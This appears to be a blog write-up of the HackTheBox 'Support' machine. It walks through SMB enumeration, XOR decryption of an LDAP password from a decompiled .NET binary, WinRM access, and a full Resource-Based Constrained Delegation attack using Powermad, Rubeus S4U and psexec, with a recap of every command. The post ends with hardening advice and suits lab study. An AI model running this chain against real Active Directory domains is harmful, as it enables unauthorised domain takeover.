---
layout: post
title: "Support - HackTheBox WriteUp"
date: 2022-12-14
categories: [CTF, HackTheBox, WriteUp]
tags: [Windows, SMB, LDAP, ReverseEngineering, ActiveDirectory, BloodHound, RBCD, PrivEsc, WinRM, Kerberos]
difficulty: Medium
platform: HackTheBox
author: Aubin SABY
lang: en
permalink: /en/blog/2022/12/14/support-htb-writeup/
excerpt: "Windows Active Directory machine with anonymous SMB share. Reverse engineering a .NET binary to extract LDAP credentials, then RBCD exploitation via BloodHound for complete domain compromise."
---

<div class="bg-gradient-to-r from-orange-500/10 to-red-500/10 p-8 rounded-xl mb-12 border-l-4 border-orange-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-orange-500 mb-3">
                <i class="fas fa-cube mr-3"></i>Support
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                Active Directory RBCD Attack via BloodHound Analysis
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-orange-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Medium
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-windows mr-1"></i>Windows
            </span>
        </div>
    </div>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm bg-white/60 dark:bg-gray-800/60 p-5 rounded-lg backdrop-blur-sm">
        <div class="flex items-center gap-2">
            <i class="fas fa-calendar text-orange-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">12/14/2022</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-network-wired text-blue-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Target IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">10.129.178.26</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-shield-alt text-purple-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">Windows Server</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-star text-amber-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">30</div>
            </div>
        </div>
    </div>
</div>

## 🎯 Synopsis

**Support** is a <span class="text-highlight-orange">**medium difficulty Windows machine**</span> implementing an <span class="text-highlight-red">**Active Directory**</span> environment.

An <span class="text-highlight-blue">**anonymous SMB share**</span> reveals a .NET binary capable of connecting to an LDAP server. Through <span class="text-highlight-purple">**reverse engineering**</span> or network analysis, the LDAP account password is discovered, allowing user enumeration. The `support` account contains its own password in the `info` attribute, leading to <span class="text-highlight-green">**WinRM connection**</span>. Through <span class="text-highlight-orange">**BloodHound**</span> analysis, we discover that the *Shared Support Accounts* group has <span class="text-highlight-red">**GenericAll**</span> privileges on the domain controller, opening the way for a <span class="text-highlight-purple">**Resource-Based Constrained Delegation (RBCD)**</span> and complete domain compromise.

<div class="grid md:grid-cols-2 gap-6 my-10">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Required Skills
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Basic Windows knowledge</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Fundamental Active Directory principles</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Understanding of LDAP and SMB</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Basic reverse engineering notions</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Skills Acquired
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Anonymous SMB access and enumeration</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>.NET decompilation with ILSpy</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>LDAP queries and AD enumeration</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>BloodHound analysis for privilege mapping</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>RBCD Attack exploitation for SYSTEM shell</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Initial Reconnaissance

### Full Port Scan

```bash
nmap -sC -sV -Pn 10.129.178.26
```

Key services discovered: **Port 445 (SMB)**, **389/636 (LDAP)**, **5985 (WinRM)**.

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Analysis:</strong> Windows system, likely Active Directory domain controller.
    </p>
</div>


## 📁 Phase 2 — SMB Enumeration

### Share Listing

```bash
smbclient -L \\\\10.129.178.26\\
```

Accessible share: **support-tools**

Download suspicious file:

```bash
smbclient \\\\10.129.178.26\\support-tools
get UserInfo.exe.zip
exit
unzip UserInfo.exe.zip
file UserInfo.exe
```

.NET application identified.


## 🧠 Phase 3 — Reverse Engineering

### Decompilation with ILSpy

```bash
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
cd artifacts/linux-x64
./ILSpy
```

Decompiled source reveals:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

### Python Decryption

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"

res = ''
for e, k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ 223)

print(res)
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold">
        <i class="fas fa-key mr-2 text-green-500"></i>
        LDAP password: <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code>
    </p>
</div>


## 🧩 Phase 4 — LDAP Connection

Configure hosts:

```bash
echo '10.129.178.26 support.htb' | sudo tee -a /etc/hosts
```

LDAP connection:

```bash
ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        LDAP connection successful\! Active Directory enumeration possible.
    </p>
</div>


## 🧍 Phase 5 — Support Account Discovery

In CN=Users, the support object contains:

```
info: Ironside47pleasure40Watchful
memberOf: Remote Management Users
```

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
        <strong>Plaintext password found\!</strong> Remote Management Users group allows WinRM connection.
    </p>
</div>


## 💻 Phase 6 — Initial WinRM Access

Connection:

```bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Shell obtained as support@support.htb\!
    </p>
</div>

User flag:

```powershell
type C:\Users\Support\Desktop\user.txt
```


## 🧭 Phase 7 — Domain Enumeration

List domain:

```powershell
Get-ADDomain
```

User groups:

```powershell
whoami /groups
```

Notable result: **Shared Support Accounts** (non-standard group)

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-search mr-2 text-amber-500"></i>
        <strong>Hypothesis:</strong> This custom group potentially holds elevated privileges on the domain.
    </p>
</div>


## 🕸️ Phase 8 — BloodHound Analysis

### Start Neo4j and BloodHound

```bash
sudo neo4j start
./BloodHound-linux-x64/BloodHound
```

### Data Collection

In Evil-WinRM:

```powershell
cd C:\Windows\Temp
upload SharpHound.exe
.\SharpHound.exe
download *.zip
```

Import into BloodHound and mark SUPPORT@SUPPORT.HTB as "Owned".

### Analysis Result

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-crown mr-2"></i>Critical Privilege Discovered
    </h4>
    <p class="text-gray-700 dark:text-gray-300 mb-2">
        The <strong>Shared Support Accounts</strong> group has <span class="text-highlight-red">GenericAll</span> on the domain controller DC.SUPPORT.HTB
    </p>
    <p class="text-sm text-gray-600 dark:text-gray-400">
        This permission allows an RBCD (Resource-Based Constrained Delegation) attack to obtain a SYSTEM shell.
    </p>
</div>


## ⚙️ Phase 9 — RBCD Exploitation

### Check Machine Quota

```powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

Result: 10 (any authenticated user can create up to 10 machines).

### Import PowerView

```powershell
upload PowerView.ps1
. ./PowerView.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

### Create Fake Machine

```powershell
upload Powermad.ps1
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

Verification:

```powershell
Get-ADComputer -Identity FAKE-COMP01
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Machine FAKE-COMP01 successfully created\!
    </p>
</div>

### Configure Delegation

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

### S4U Attack with Rubeus

RC4 hash:

```powershell
upload Rubeus.exe
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

Execution:

```powershell
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-ticket-alt mr-2 text-green-500"></i>
        Kerberos ticket for Administrator generated and injected\!
    </p>
</div>


## 👑 Phase 10 — SYSTEM Shell

Ticket conversion and usage:

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        NT AUTHORITY\SYSTEM obtained\!
    </p>
</div>

Root flag:

```
C:\Users\Administrator\Desktop\root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag:</strong> C:\Users\Support\Desktop\user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag:</strong> C:\Users\Administrator\Desktop\root.txt
            </p>
        </div>
    </div>
</div>


## 📋 Phase 11 — Recommendations

<div class="grid md:grid-cols-2 gap-6 my-8">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-center">
            <i class="fas fa-folder-open mr-2"></i>SMB & LDAP
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Remove anonymous SMB access</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Never store plaintext passwords in LDAP attributes</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Enable LDAP & Kerberos logging</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-center">
            <i class="fas fa-shield-alt mr-2"></i>Active Directory
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Restrict GenericAll privileges</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Control ms-DS-MachineAccountQuota</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>AD privilege segmentation</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Command Summary

### 🔍 Phase 1: Reconnaissance & Initial Access (Linux)

```bash
# 1. Network scan
nmap -sC -sV -Pn 10.129.178.26

# 2. SMB enumeration
smbclient -L \\\\10.129.178.26\\
smbclient \\\\10.129.178.26\\support-tools
# → Download UserInfo.exe.zip

# 3. LDAP password decryption (after reverse engineering)
python3 decrypt.py
# → Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

# 4. LDAP query to enumerate users
ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
# → Find 'support' password in 'info' attribute

# 5. WinRM connection with support user
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

### 🔐 Phase 2: AD Enumeration (PowerShell on target)

```powershell
# 1. Check domain and groups
Get-ADDomain
whoami /groups
# → Member of 'Shared Support Accounts'

# 2. Check machine creation quota
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
# → Quota = 10 (we can create machines)
```

### 🕸️ Phase 3: BloodHound Collection (PowerShell)

```powershell
# 1. Navigate to writable directory
cd C:\Windows\Temp

# 2. Upload and execute SharpHound
upload SharpHound.exe
.\SharpHound.exe

# 3. Download results
download *.zip
```

### ⚙️ Phase 4: RBCD Attack (PowerShell)

```powershell
# 1. Upload and import PowerView
upload PowerView.ps1
. ./PowerView.ps1

# 2. Check current delegations
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

# 3. Create fake machine with Powermad
upload Powermad.ps1
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# 4. Verify creation
Get-ADComputer -Identity FAKE-COMP01

# 5. Configure delegation on DC
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

### 🎫 Phase 5: Kerberos Ticket Generation (PowerShell)

```powershell
# 1. Upload Rubeus
upload Rubeus.exe

# 2. Generate RC4 hash
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
# → RC4: 58A478135A93AC3BF058A5EA0E8FDB71

# 3. Execute S4U attack to impersonate Administrator
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
# → Copy generated base64 ticket
```

### 👑 Phase 6: SYSTEM Shell (Linux)

```bash
# 1. Convert Kerberos ticket
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache

# 2. Use ticket to get Administrator shell
export KRB5CCNAME=ticket.ccache
psexec.py support.htb/administrator@dc.support.htb -k -no-pass
# → NT AUTHORITY\SYSTEM obtained!
```

---

## 🔗 Attack Chain Summary

<div class="bg-white dark:bg-dark-navbar p-8 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-6 flex items-center">
        <i class="fas fa-project-diagram mr-3"></i>Complete Attack Path
    </h3>
    <div class="space-y-4">
        <div class="flex items-center gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance and SMB Access</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → Anonymous SMB → UserInfo.exe.zip</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Reverse Engineering</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">ILSpy → XOR Decryption → LDAP Credentials</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">LDAP Enumeration and WinRM</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">ldapsearch → info attribute → WinRM support</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Privilege Escalation</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">BloodHound → GenericAll → RBCD Attack → SYSTEM</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & References

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Windows</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SMB</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">LDAP</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ReverseEngineering</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ActiveDirectory</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">BloodHound</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">RBCD</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(14, 165, 233, 0.1); color: #0ea5e9; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivEsc</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WinRM</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Kerberos</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Useful References
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Resource-Based Constrained Delegation Explained
            </a>
        </li>
        <li>
            <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                BloodHound - Active Directory Attack Path Mapping
            </a>
        </li>
        <li>
            <a href="https://github.com/icsharpcode/ILSpy" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                ILSpy - .NET Decompiler
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/en/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Back to blog
    </a>
</div>
